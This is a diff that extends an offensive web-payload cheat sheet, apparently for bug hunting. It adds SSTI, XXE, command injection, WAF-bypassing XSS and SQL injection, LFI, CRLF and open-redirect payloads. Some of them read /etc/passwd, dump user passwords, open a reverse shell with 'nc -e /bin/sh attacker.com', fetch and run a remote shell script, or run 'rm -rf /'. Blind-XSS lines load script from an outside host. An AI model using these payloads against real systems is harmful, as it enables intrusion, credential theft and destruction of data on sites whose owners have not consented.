@@ -81,6 +81,13 @@ ${7*7}@ssti.com (Freemarker, Velocity - Should return 49 if vulnerable)
 <%= 7*7 %>@ssti.com (ERB - Should return 49 if vulnerable)
 {{request.application.__globals__.__builtins__.__import__('os').system('id')}}@ssti.com (Python Flask SSTI RCE)
 
+🔥 Advanced SSTI Payloads
+{{"".__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read()}}@ssti.com
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}@ssti.com
+{{ ''.__class__.__mro__[1].__subclasses__()|join }}@ssti.com
+{{ self._globals['os'].system('whoami') }}@twig.com
+
+
 🔹 HTML Injection Payloads
 <h1>Hacked</h1>@html.com
 <b>BoldText</b>@inject.com
@@ -89,6 +96,67 @@ ${7*7}@ssti.com (Freemarker, Velocity - Should return 49 if vulnerable)
 <iframe src="http://malicious.com"></iframe>@inject.com
 <script>alert('HTML Injected')</script>@vulnerable.com
 
+🔥 Advanced HTML Injection Bypass Payloads
+<svg/onload=eval(atob('YWxlcnQoMSk='))>@html.com
+<math><mtext onfocus=alert(1) autofocus>@html.com
+<noscript><style>@import'javascript:alert(1)';</style></noscript>@html.com
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">@meta.com
+
+🔹 XML External Entity (XXE) Injection Payloads
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>@xxe.com
+<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com"> ]>@xxe.com
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>@xxe.com
+<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd"> %remote; ]>@xxe.com
+
+🔥 Advanced XXE Injection Payloads
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>@xxe.com
+<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote; ]>@xxe.com
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>@xxe.com
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>@xxe.com
+
+🔹 Command Injection Payloads
+"; ls -la; echo "@cmd.com
+"; whoami; echo "@cmd.com
+"; cat /etc/passwd; echo "@cmd.com
+"; nc -e /bin/sh attacker.com 4444; echo "@cmd.com
+"; rm -rf /; echo "@cmd.com (DANGEROUS! Deletes system files if executed)
+
+🔥 Advanced Command Injection Bypass Payloads
+`$(whoami)`@cmd.com
+`$(echo 77686f616d69 | xxd -r -p)`@cmd.com
+`wget%20http://attacker.com/shell.sh%20-O%20/tmp/shell.sh;sh%20/tmp/shell.sh`@cmd.com
+`cat${IFS}/etc/passwd`@cmd.com
+`sh -c 'rm -rf /'`@cmd.com
+
+
+🔥 Advanced WAF-Bypassing XSS Payloads
+"><svg/onload=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>@xss.com
+"><svg/onload=setTimeout('alert(1)')>@xss.com
+"><script>[].constructor.constructor('alert(1)')()</script>@xss.com
+" style="animation-name:x" onanimationstart="alert(1)">@xss.com
+"><a href=javascript:"\u0061\u006c\u0065\u0072\u0074(1)">Click</a>@xss.com
+
+🔥 Advanced XSS (Cross-Site Scripting) Payloads (WAF-Bypassing)
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<svg onload=location=`javascript:alert(1)`>
+<script>setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')</script>
+<svg><script xlink:href=data:,alert(1)></script></svg>
+
+
+🔥 Advanced WAF-Bypassing SQL Injection Payloads
+' UNION SELECT 0x65,0x6d,0x61,0x69,0x6c FROM users --@sql.com
+' OR IF(LENGTH(database())=8, SLEEP(5), 0) --@delay.com
+' UNION SELECT CHAR(101,109,97,105,108) FROM users --@bypass.com
+' UnIoN SeLeCt 1,2,email,password FrOm users --@waf.com
+'/*! UnIoN */ SeLeCt email,password FrOm users --@stealth.com
+
+🔥 Advanced SQL Injection (SQLi) Payloads (WAF-Bypassing)
+' UNION SELECT 0x6461746162617365,0x7573657273 FROM information_schema.tables -- 
+' UnIoN SeLeCt 1,2,3,group_concat(username,0x3a,password) FrOm users --
+'/*! UnIoN */ SeLeCt 1,2,3,email,password FrOm users --
+' OR IF(LENGTH(database())=8, SLEEP(5), 0) -- 
+' UNION SELECT CHAR(97,100,109,105,110), CHAR(112,97,115,115) FROM users -- 
 
 
 Blind XSS:
@@ -127,8 +195,76 @@ From: "XSS Tester"><script src=https://xss0r.com/c/lostsec></script>" <test@exam
 Subject: Your Request"><script src=https://xss0r.com/c/lostsec></script>
 +1-800-123-"'><script src=https://xss0r.com/c/lostsec></script>'
 <input type="tel" name="phone" value='"><script src=https://xss0r.com/c/lostsec></script>'>
-{
-  "phone": "\"><script src=https://xss0r.com/c/lostsec></script>"
-}
+"\"><script src=https://xss0r.com/c/lostsec></script>
 <input type="text" name="voucher" value='"><script src=https://xss0r.com/c/lostsec></script>'>
 
+
+🔥 Advanced Open Redirect Payloads
+https://victim.com/redirect?url=//evil.com
+https://victim.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+🔥 Advanced LFI (Local File Inclusion) Payloads
+php://filter/convert.base64-encode/resource=/etc/passwd
+/var/log/apache2/access.log
+/....//....//....//etc/passwd
+
+🔥 Advanced CRLF Injection Payloads
+%0D%0ASet-Cookie:session=steal;%20HttpOnly;%20Secure
+%0D%0ALocation: http://evil.com
+
+🔥 Advanced XXE Injection Payloads
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote; ]>
+
+🔥 Advanced Command Injection Payloads
+`cat${IFS}/etc/passwd`
+echo d2hvYW1pCg== | base64 -d | bash
+`;wget -qO- attacker.com/shell.sh|bash`
+
+🔥 Advanced HTML Injection Payloads
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<noscript><style>@import'javascript:alert(1)';</style></noscript>
+
+🔥 Advanced Tagless XSS Payloads (No <script>, <img>, <svg>, etc.)
+javascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+javascript:setTimeout('alert(1)',100)
+eval('alert(1)')
+
+🛠️ Event-Based Execution Without Tags
+" onmouseover="alert(1)
+" onfocus="alert(1)
+" style="animation-name:x" onanimationstart="alert(1)
+
+🛠️ CSS-Based Execution (No JavaScript, No Tags)
+" style="xss:expression(alert(1))
+" style="animation:alertXSS 1s infinite
+@keyframes alertXSS { 0% {opacity:1} 100% {opacity:0;alert(1)} }
+
+🛠️ JavaScript Execution Through URL Redirection
+window.location="javascript:alert(1)"
+history.pushState('', '', 'javascript:alert(1)')
+
+🔥 Pure CSS-Based Execution (No JavaScript, No Handlers, No Tags)
+" style="content:'XSS';"
+" style="@import url(//evil.com/xss.css);"
+" style="animation:xss 1s infinite"
+@keyframes xss { from {content:'XSS'} }
+" style="[data-xss] {content:'XSS'}"
+
+🔥 Using HTTP Headers for XSS-Like Attacks
+%0D%0ASet-Cookie:session=steal;%20HttpOnly;%20Secure
+%0D%0ALocation: //evil.com
+/%0D%0ALocation:%20//evil.com
+
+🔥 HTML Entity Encoding & Unicode-Based Bypass
+" &#x48;&#x61;&#x63;&#x6b;&#x65;&#x64; "
+" &#x202E;txt.tneilc& " (Reverses text direction)
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+🔥 Exploiting Misconfigured Form Inputs
+Using Hidden Inputs for Persistent Data Manipulation -->  <input type="hidden" value="Injected">
+
+🔥 Unicode Confusion & Logic-Based Injection
+" 𝗛𝗮𝗰𝗸𝗲𝗱 "
+" && 'Injected' && "
